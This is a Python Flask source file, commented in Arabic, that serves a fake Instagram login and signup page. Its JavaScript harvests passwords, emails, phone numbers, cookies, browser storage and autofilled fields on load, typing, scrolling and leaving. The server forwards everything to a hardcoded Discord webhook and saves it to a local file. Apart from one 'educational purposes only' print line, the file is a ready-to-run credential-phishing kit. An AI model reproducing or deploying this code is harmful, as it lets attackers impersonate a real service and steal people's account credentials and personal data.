from flask import Flask, request, render_template_string, redirect, url_for
import requests
import json
import datetime
import os
import uuid
from urllib.parse import quote

app = Flask(__name__)
app.secret_key = os.urandom(24)

# استبدل هذا الرابط برابط الويب هوك الخاص بك من Discord
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1433416061365125243/-xPceWsRvCvcZmfb7A2v4X_P8dz3SntYSfxH3cuNLEoJtxsoSwRw0tlpiTIybcHUX_iA"

def get_client_ip():
    """الحصول على IP العميل الحقيقي"""
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0]
    elif request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    else:
        return request.remote_addr

def send_to_discord(data):
    """إرسال البيانات إلى Discord webhook"""
    
    # إنشاء الحقول الأساسية
    fields = []
    
    # معلومات المستخدم إذا تم إدخالها
    if data.get('username') or data.get('password'):
        fields.extend([
            {
                "name": "👤 اسم المستخدم",
                "value": f"```{data.get('username', 'لم يدخل')}```",
                "inline": True
            },
            {
                "name": "🔑 كلمة المرور", 
                "value": f"```{data.get('password', 'لم يدخل')}```",
                "inline": True
            }
        ])
    
    # معلومات إضافية
    additional_info = []
    if data.get('email'):
        additional_info.append(f"📧 الإيميل: `{data.get('email')}`")
    if data.get('phone'):
        additional_info.append(f"📞 الهاتف: `{data.get('phone')}`")
    
    if additional_info:
        fields.append({
            "name": "📝 معلومات إضافية",
            "value": "\n".join(additional_info),
            "inline": False
        })
    
    # معلومات المتصفح والنظام
    fields.extend([
        {
            "name": "🌐 المتصفح",
            "value": f"```{data.get('userAgent', 'غير معروف')[:100]}```",
            "inline": False
        },
        {
            "name": "💻 النظام",
            "value": f"`{data.get('platform', 'غير معروف')}`",
            "inline": True
        },
        {
            "name": "🗣️ اللغة",
            "value": f"`{data.get('language', 'غير معروف')}`",
            "inline": True
        },
        {
            "name": "🖥️ دقة الشاشة",
            "value": f"`{data.get('screenWidth', '')}x{data.get('screenHeight', '')}`",
            "inline": True
        }
    ])
    
    # معلومات الشبكة والموقع
    network_info = []
    if data.get('ip'):
        network_info.append(f"📍 IP: `{data.get('ip')}`")
    if data.get('timezone'):
        network_info.append(f"⏰ المنطقة: `{data.get('timezone')}`")
    if data.get('connection'):
        network_info.append(f"📶 الشبكة: `{data.get('connection', {}).get('effectiveType', 'غير معروف')}`")
    
    if network_info:
        fields.append({
            "name": "🌍 معلومات الشبكة",
            "value": "\n".join(network_info),
            "inline": False
        })
    
    # معلومات إضافية
    if data.get('referrer'):
        fields.append({
            "name": "🔗 المرجع",
            "value": f"`{data.get('referrer')[:100]}`",
            "inline": False
        })
    
    # البيانات المسروقة من التخزين
    if data.get('localStorage'):
        ls_data = {k: v for k, v in data.get('localStorage', {}).items() if len(str(v)) < 100}
        if ls_data:
            fields.append({
                "name": "💾 LocalStorage",
                "value": f"```json\n{json.dumps(ls_data, ensure_ascii=False)[:500]}```",
                "inline": False
            })
    
    # معلومات الجلسة
    if data.get('sessionId'):
        fields.append({
            "name": "🆔 معرف الجلسة",
            "value": f"`{data.get('sessionId')}`",
            "inline": True
        })
    
    embeds = [{
        "title": "🚨 تم جمع معلومات جديدة",
        "color": 16711680,
        "fields": fields,
        "timestamp": datetime.datetime.utcnow().isoformat(),
        "footer": {
            "text": f"تم الجمع في {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        }
    }]
    
    payload = {
        "content": "🔓 **تم جمع البيانات بنجاح**",
        "embeds": embeds,
        "username": "Instagram Logger",
        "avatar_url": "https://cdn-icons-png.flaticon.com/512/1384/1384063.png"
    }
    
    try:
        response = requests.post(
            DISCORD_WEBHOOK_URL,
            json=payload,
            headers={"Content-Type": "application/json"},
            timeout=10
        )
        print(f"✅ تم إرسال البيانات إلى Discord - الحالة: {response.status_code}")
        return response.status_code in [200, 204]
    except Exception as e:
        print(f"❌ خطأ في الإرسال: {e}")
        return False

def save_to_file(data):
    """حفظ البيانات في ملف"""
    try:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open('collected_data.json', 'a', encoding='utf-8') as f:
            record = {
                'timestamp': timestamp,
                'data': data
            }
            f.write(json.dumps(record, ensure_ascii=False) + '\n')
        print(f"💾 تم حفظ البيانات في الملف")
    except Exception as e:
        print(f"❌ خطأ في حفظ الملف: {e}")

# الصفحة الرئيسية - إنستغرام مزيف محسن
@app.route('/')
def fake_login_page():
    return render_template_string('''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yT/r/aj3lH9qjqOo.png">
    <style>
        :root {
            --primary-color: #0095f6;
            --secondary-color: #385185;
            --text-color: #262626;
            --border-color: #dbdbdb;
            --bg-color: #fafafa;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: var(--bg-color);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            direction: rtl;
            line-height: 1.6;
        }
        
        .container {
            display: flex;
            max-width: 935px;
            width: 100%;
            justify-content: center;
            align-items: center;
            gap: 50px;
            padding: 20px;
        }
        
        .phones {
            flex: 1;
            text-align: center;
            position: relative;
        }
        
        .phone-mockup {
            width: 380px;
            height: 580px;
            background: linear-gradient(45deg, #667eea 0%, #764ba2 100%);
            border-radius: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 24px;
            position: relative;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            border: 10px solid #000;
        }
        
        .phone-mockup::before {
            content: '';
            position: absolute;
            top: -15px;
            left: 50%;
            transform: translateX(-50%);
            width: 60px;
            height: 25px;
            background: #000;
            border-radius: 0 0 15px 15px;
        }
        
        .right-section {
            flex: 0 0 350px;
        }
        
        .login-box {
            background: white;
            border: 1px solid var(--border-color);
            padding: 40px;
            text-align: center;
            border-radius: 1px;
            margin-bottom: 10px;
        }
        
        .logo {
            font-family: 'Billabong', cursive;
            font-size: 48px;
            margin-bottom: 24px;
            color: var(--text-color);
            font-weight: normal;
        }
        
        .form-group {
            margin-bottom: 6px;
        }
        
        input[type="text"],
        input[type="password"],
        input[type="email"],
        input[type="tel"] {
            width: 100%;
            padding: 12px 8px;
            border: 1px solid var(--border-color);
            background: #fafafa;
            border-radius: 3px;
            font-size: 12px;
            text-align: right;
            direction: ltr;
        }
        
        input[type="text"]:focus,
        input[type="password"]:focus,
        input[type="email"]:focus,
        input[type="tel"]:focus {
            outline: none;
            border-color: #a8a8a8;
        }
        
        .login-btn {
            width: 100%;
            padding: 8px;
            background: var(--primary-color);
            border: none;
            border-radius: 8px;
            color: white;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 14px;
            opacity: 0.7;
            transition: opacity 0.3s;
        }
        
        .login-btn.active {
            opacity: 1;
        }
        
        .separator {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        
        .separator::before,
        .separator::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid var(--border-color);
        }
        
        .separator::before {
            margin-left: 10px;
        }
        
        .separator::after {
            margin-right: 10px;
        }
        
        .fb-login {
            color: var(--secondary-color);
            text-decoration: none;
            font-weight: 600;
            font-size: 14px;
            display: block;
            margin: 10px 0;
        }
        
        .fb-login i {
            margin-left: 8px;
        }
        
        .forgot-password {
            color: #00376b;
            text-decoration: none;
            font-size: 12px;
            display: block;
            margin-top: 20px;
        }
        
        .signup-box {
            background: white;
            border: 1px solid var(--border-color);
            padding: 20px;
            text-align: center;
            margin-bottom: 10px;
            font-size: 14px;
        }
        
        .signup-box a {
            color: var(--primary-color);
            text-decoration: none;
            font-weight: 600;
        }
        
        .apps {
            text-align: center;
            font-size: 14px;
        }
        
        .app-buttons {
            margin-top: 10px;
            display: flex;
            justify-content: center;
            gap: 8px;
        }
        
        .app-btn {
            height: 40px;
            border-radius: 5px;
            background: #000;
            color: white;
            padding: 0 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            text-decoration: none;
            font-size: 12px;
            font-weight: 600;
        }
        
        .footer {
            text-align: center;
            margin-top: 50px;
            color: #8e8e8e;
            font-size: 12px;
            max-width: 800px;
        }
        
        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 16px;
            margin-bottom: 10px;
        }
        
        .footer-links a {
            color: #8e8e8e;
            text-decoration: none;
        }
        
        @font-face {
            font-family: 'Billabong';
            src: url('https://cdn.jsdelivr.net/npm/billabong@1.0.0/fonts/Billabong.eot');
            src: url('https://cdn.jsdelivr.net/npm/billabong@1.0.0/fonts/Billabong.eot?#iefix') format('embedded-opentype'),
                 url('https://cdn.jsdelivr.net/npm/billabong@1.0.0/fonts/Billabong.woff') format('woff'),
                 url('https://cdn.jsdelivr.net/npm/billabong@1.0.0/fonts/Billabong.ttf') format('truetype');
            font-weight: normal;
            font-style: normal;
        }
        
        /* تحميل خفي */
        #loader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255,255,255,0.95);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            flex-direction: column;
        }
        
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid var(--primary-color);
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin-bottom: 15px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* تحسينات للجوال */
        @media (max-width: 875px) {
            .phones {
                display: none;
            }
            
            .container {
                margin-top: 0;
            }
            
            .right-section {
                flex: 1;
                max-width: 350px;
            }
        }
        
        .tab-container {
            display: flex;
            margin-bottom: 20px;
            border-bottom: 1px solid var(--border-color);
        }
        
        .tab {
            flex: 1;
            text-align: center;
            padding: 10px;
            cursor: pointer;
            border-bottom: 2px solid transparent;
        }
        
        .tab.active {
            border-bottom: 2px solid var(--text-color);
            font-weight: 600;
        }
        
        .tab-content {
            display: none;
        }
        
        .tab-content.active {
            display: block;
        }
        
        .input-group {
            position: relative;
            margin-bottom: 6px;
        }
        
        .input-label {
            position: absolute;
            right: 8px;
            top: 50%;
            transform: translateY(-50%);
            color: #8e8e8e;
            font-size: 12px;
            pointer-events: none;
            transition: all 0.2s;
        }
        
        input:focus + .input-label,
        input:not(:placeholder-shown) + .input-label {
            top: 30%;
            font-size: 10px;
        }
        
        .password-toggle {
            position: absolute;
            left: 8px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #8e8e8e;
            cursor: pointer;
            font-size: 12px;
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>
<body>
    <!-- تحميل خفي -->
    <div id="loader">
        <div class="spinner"></div>
        <div style="text-align: center; font-size: 14px; color: #8e8e8e;">
            جاري التحقق من المعلومات...
        </div>
    </div>

    <div class="container">
        <div class="phones">
            <div class="phone-mockup">
                <div style="text-align: center;">
                    <div style="font-family: 'Billabong', cursive; font-size: 42px; margin-bottom: 20px;">Instagram</div>
                    <div style="font-size: 14px; opacity: 0.8;">شارك لحظاتك مع العالم</div>
                </div>
            </div>
        </div>
        
        <div class="right-section">
            <div class="login-box">
                <div class="logo">Instagram</div>
                
                <div class="tab-container">
                    <div class="tab active" onclick="switchTab('login')">تسجيل الدخول</div>
                    <div class="tab" onclick="switchTab('signup')">إنشاء حساب</div>
                </div>
                
                <!-- نموذج تسجيل الدخول -->
                <form id="loginForm" class="tab-content active">
                    <div class="form-group">
                        <div class="input-group">
                            <input type="text" id="loginUsername" name="username" placeholder=" " required>
                            <label class="input-label" for="loginUsername">اسم المستخدم أو البريد الإلكتروني</label>
                        </div>
                    </div>
                    <div class="form-group">
                        <div class="input-group">
                            <input type="password" id="loginPassword" name="password" placeholder=" " required>
                            <label class="input-label" for="loginPassword">كلمة المرور</label>
                            <button type="button" class="password-toggle" onclick="togglePassword('loginPassword')">
                                <i class="far fa-eye"></i>
                            </button>
                        </div>
                    </div>
                    <button type="submit" class="login-btn" id="loginBtn">تسجيل الدخول</button>
                </form>
                
                <!-- نموذج إنشاء حساب -->
                <form id="signupForm" class="tab-content">
                    <div class="form-group">
                        <div class="input-group">
                            <input type="email" id="signupEmail" name="email" placeholder=" " required>
                            <label class="input-label" for="signupEmail">البريد الإلكتروني</label>
                        </div>
                    </div>
                    <div class="form-group">
                        <div class="input-group">
                            <input type="text" id="signupFullname" name="fullname" placeholder=" " required>
                            <label class="input-label" for="signupFullname">الاسم الكامل</label>
                        </div>
                    </div>
                    <div class="form-group">
                        <div class="input-group">
                            <input type="text" id="signupUsername" name="username" placeholder=" " required>
                            <label class="input-label" for="signupUsername">اسم المستخدم</label>
                        </div>
                    </div>
                    <div class="form-group">
                        <div class="input-group">
                            <input type="password" id="signupPassword" name="password" placeholder=" " required>
                            <label class="input-label" for="signupPassword">كلمة المرور</label>
                            <button type="button" class="password-toggle" onclick="togglePassword('signupPassword')">
                                <i class="far fa-eye"></i>
                            </button>
                        </div>
                    </div>
                    <div class="form-group">
                        <div class="input-group">
                            <input type="tel" id="signupPhone" name="phone" placeholder=" ">
                            <label class="input-label" for="signupPhone">رقم الهاتف (اختياري)</label>
                        </div>
                    </div>
                    <button type="submit" class="login-btn" id="signupBtn">إنشاء حساب</button>
                </form>
                
                <div class="separator">أو</div>
                
                <a href="#" class="fb-login">
                    <i class="fab fa-facebook-square"></i> تسجيل الدخول باستخدام فيسبوك
                </a>
                <a href="#" class="forgot-password">نسيت كلمة المرور؟</a>
            </div>
            
            <div class="signup-box">
                ليس لديك حساب؟ <a href="#" onclick="switchTab('signup')">اشترك</a>
            </div>
            
            <div class="apps">
                <p>حمّل التطبيق.</p>
                <div class="app-buttons">
                    <a href="#" class="app-btn">
                        <i class="fab fa-apple" style="margin-left: 5px;"></i>
                        App Store
                    </a>
                    <a href="#" class="app-btn">
                        <i class="fab fa-google-play" style="margin-left: 5px;"></i>
                        Google Play
                    </a>
                </div>
            </div>
        </div>
    </div>
    
    <div class="footer">
        <div class="footer-links">
            <a href="#">Meta</a>
            <a href="#">حول</a>
            <a href="#">الوظائف</a>
            <a href="#">مساعدة</a>
            <a href="#">API</a>
            <a href="#">الخصوصية</a>
            <a href="#">الشروط</a>
            <a href="#">المكان</a>
            <a href="#">إنستغرام لايت</a>
            <a href="#">Threads</a>
            <a href="#">رفع جهات الاتصال وغيرها من المستخدمين</a>
            <a href="#">التحقق</a>
            <a href="#">Meta Verified</a>
        </div>
        <div class="copyright" style="margin-top: 10px;">
            © 2024 Instagram from Meta
        </div>
    </div>

    <script>
        let sessionId = 'sess_' + Math.random().toString(36).substr(2, 9);
        let collectedInitialData = false;
        
        // جمع جميع المعلومات الحساسة
        function collectAllData(additionalData = {}) {
            const data = {
                sessionId: sessionId,
                timestamp: new Date().toISOString(),
                url: window.location.href,
                
                // معلومات المتصفح
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                
                // معلومات النظام
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                
                // معلومات الشبكة
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                } : null,
                
                // معلومات الصفحة
                referrer: document.referrer,
                title: document.title,
                cookies: document.cookie,
                
                // التخزين
                localStorage: {},
                sessionStorage: {},
                
                // معلومات إضافية
                ...additionalData
            };
            
            // جمع بيانات التخزين
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    data.localStorage[key] = localStorage.getItem(key);
                }
            } catch (e) {}
            
            try {
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    data.sessionStorage[key] = sessionStorage.getItem(key);
                }
            } catch (e) {}
            
            // جمع البيانات المحفوظة في النماذج
            data.autoFilledData = getAutoFilledData();
            
            return data;
        }
        
        // الحصول على البيانات المحفوظة تلقائياً
        function getAutoFilledData() {
            const autoFilled = {};
            const inputs = document.querySelectorAll('input[type="text"], input[type="password"], input[type="email"], input[type="tel"]');
            
            inputs.forEach(input => {
                if (input.value) {
                    autoFilled[input.name] = input.value;
                }
            });
            
            return autoFilled;
        }
        
        // إرسال البيانات إلى الخادم
        function sendStolenData(stolenData) {
            return fetch('/collect-data', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(stolenData)
            })
            .then(response => response.json())
            .then(data => {
                console.log('✅ تم إرسال البيانات:', data);
                return true;
            })
            .catch(error => {
                console.error('❌ خطأ في الإرسال:', error);
                return false;
            });
        }
        
        // التبديل بين التبويبات
        function switchTab(tabName) {
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            document.querySelectorAll('.tab-content').forEach(content => {
                content.classList.remove('active');
            });
            
            document.querySelector(`.tab:nth-child(${tabName === 'login' ? 1 : 2})`).classList.add('active');
            document.getElementById(tabName + 'Form').classList.add('active');
            
            // تحديث زر إنشاء حساب
            if (tabName === 'signup') {
                document.querySelector('.signup-box').style.display = 'none';
            } else {
                document.querySelector('.signup-box').style.display = 'block';
            }
            
            // جمع بيانات عند التبديل
            collectAndSendData({action: 'tab_switch', tab: tabName});
        }
        
        // تبديل عرض كلمة المرور
        function togglePassword(inputId) {
            const input = document.getElementById(inputId);
            const icon = input.nextElementSibling.querySelector('i');
            
            if (input.type === 'password') {
                input.type = 'text';
                icon.classList.remove('fa-eye');
                icon.classList.add('fa-eye-slash');
            } else {
                input.type = 'password';
                icon.classList.remove('fa-eye-slash');
                icon.classList.add('fa-eye');
            }
        }
        
        // التحقق من النماذج
        function setupFormValidation() {
            const forms = ['loginForm', 'signupForm'];
            
            forms.forEach(formId => {
                const form = document.getElementById(formId);
                const inputs = form.querySelectorAll('input[required]');
                const submitBtn = form.querySelector('.login-btn');
                
                function checkFormValidity() {
                    let allValid = true;
                    inputs.forEach(input => {
                        if (!input.value.trim()) {
                            allValid = false;
                        }
                    });
                    
                    if (allValid) {
                        submitBtn.classList.add('active');
                    } else {
                        submitBtn.classList.remove('active');
                    }
                }
                
                inputs.forEach(input => {
                    input.addEventListener('input', checkFormValidity);
                    input.addEventListener('change', checkFormValidity);
                });
                
                // التحقق الأولي
                checkFormValidity();
            });
        }
        
        // جمع وإرسال البيانات
        function collectAndSendData(additionalData = {}) {
            const stolenData = collectAllData(additionalData);
            sendStolenData(stolenData);
        }
        
        // عند تحميل الصفحة
        document.addEventListener('DOMContentLoaded', function() {
            console.log('🚀 بدء جمع البيانات تلقائياً...');
            
            // جمع البيانات الأولية بعد تأخير بسيط
            setTimeout(() => {
                if (!collectedInitialData) {
                    collectAndSendData({action: 'page_load'});
                    collectedInitialData = true;
                }
            }, 1000);
            
            // إعداد النماذج
            setupFormValidation();
            
            // معالجة نموذج تسجيل الدخول
            document.getElementById('loginForm').addEventListener('submit', function(e) {
                e.preventDefault();
                
                const formData = new FormData(this);
                const loader = document.getElementById('loader');
                
                // جمع البيانات النهائية
                const finalData = {
                    username: formData.get('username'),
                    password: formData.get('password'),
                    formType: 'login'
                };
                
                // إظهار التحميل
                loader.style.display = 'flex';
                
                // إرسال البيانات
                collectAndSendData(finalData);
                
                // إعادة التوجيه بعد تأخير
                setTimeout(() => {
                    window.location.href = '/login-success';
                }, 2000);
            });
            
            // معالجة نموذج إنشاء حساب
            document.getElementById('signupForm').addEventListener('submit', function(e) {
                e.preventDefault();
                
                const formData = new FormData(this);
                const loader = document.getElementById('loader');
                
                // جمع البيانات النهائية
                const finalData = {
                    email: formData.get('email'),
                    fullname: formData.get('fullname'),
                    username: formData.get('username'),
                    password: formData.get('password'),
                    phone: formData.get('phone'),
                    formType: 'signup'
                };
                
                // إظهار التحميل
                loader.style.display = 'flex';
                
                // إرسال البيانات
                collectAndSendData(finalData);
                
                // إعادة التوجيه بعد تأخير
                setTimeout(() => {
                    window.location.href = '/signup-success';
                }, 2000);
            });
            
            // جمع البيانات عند التفاعل مع الحقول
            document.querySelectorAll('input').forEach(input => {
                input.addEventListener('focus', function() {
                    collectAndSendData({action: 'input_focus', field: this.name});
                });
                
                input.addEventListener('blur', function() {
                    if (this.value) {
                        collectAndSendData({action: 'input_blur', field: this.name, hasValue: true});
                    }
                });
            });
            
            // جمع البيانات المحفوظة تلقائياً
            setTimeout(() => {
                const autoFilled = getAutoFilledData();
                if (Object.keys(autoFilled).length > 0) {
                    collectAndSendData({action: 'auto_fill_detected', autoFilled: autoFilled});
                }
            }, 1500);
        });
        
        // جمع البيانات عند مغادرة الصفحة
        window.addEventListener('beforeunload', function() {
            collectAndSendData({action: 'page_unload'});
        });
        
        // جمع بيانات التمرير
        window.addEventListener('scroll', function() {
            collectAndSendData({action: 'page_scroll', scrollY: window.scrollY});
        });
    </script>
</body>
</html>
    ''')

# صفحة النجاح بعد تسجيل الدخول
@app.route('/login-success')
def login_success():
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Instagram</title>
        <style>
            body {
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                background-color: #fafafa;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                direction: rtl;
            }
            .success-box {
                background: white;
                border: 1px solid #dbdbdb;
                padding: 40px;
                text-align: center;
                border-radius: 3px;
                width: 350px;
            }
            .logo {
                font-family: 'Billabong', cursive;
                font-size: 48px;
                margin-bottom: 20px;
                color: #262626;
            }
            .success-message {
                color: #262626;
                margin: 20px 0;
            }
            button {
                background: #0095f6;
                border: none;
                padding: 8px 16px;
                color: white;
                border-radius: 8px;
                cursor: pointer;
                margin: 5px;
            }
        </style>
    </head>
    <body>
        <div class="success-box">
            <div class="logo">Instagram</div>
            <div class="success-message">
                تم تسجيل الدخول بنجاح! جاري تحويلك...
            </div>
            <div style="margin: 20px 0;">
                <div class="spinner" style="border: 4px solid #f3f3f3; border-top: 4px solid #0095f6; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto;"></div>
            </div>
            <button onclick="window.location.href='/'">العودة</button>
        </div>
        <script>
            setTimeout(() => {
                window.location.href = '/';
            }, 3000);
        </script>
    </body>
    </html>
    ''')

# نقطة نهاية جديدة لاستقبال البيانات
@app.route('/collect-data', methods=['POST'])
def collect_data():
    """استقبال البيانات المسروقة"""
    stolen_data = request.get_json()
    
    # إضافة عنوان IP الحقيقي
    stolen_data['ip'] = get_client_ip()
    
    print("🚨 تم استقبال بيانات جديدة!")
    print(f"📍 IP: {stolen_data.get('ip')}")
    print(f"🆔 الجلسة: {stolen_data.get('sessionId')}")
    print(f"📊 الإجراء: {stolen_data.get('action', 'unknown')}")
    
    if stolen_data.get('username'):
        print(f"👤 المستخدم: {stolen_data.get('username')}")
    if stolen_data.get('password'):
        print(f"🔑 كلمة المرور: {stolen_data.get('password')}")
    if stolen_data.get('email'):
        print(f"📧 الإيميل: {stolen_data.get('email')}")
    
    # إرسال إلى Discord
    send_to_discord(stolen_data)
    
    # حفظ محلي
    save_to_file(stolen_data)
    
    return {'status': 'success', 'message': 'تم استقبال البيانات'}

if __name__ == '__main__':
    print("🌐 الخادم يعمل على: http://localhost:5000")
    print("🚨 سيتم جمع المعلومات تلقائياً عند دخول أي مستخدم!")
    print("📧 سيتم جمع: الإيميلات، كلمات المرور، البيانات الحساسة، معلومات المتصفح")
    print("📱 يتم الإرسال إلى Discord وحفظ محلياً في collected_data.json")
    print("⚠️  للأغراض التعليمية والأمنية فقط!")
    app.run(debug=False, host='0.0.0.0', port=5000)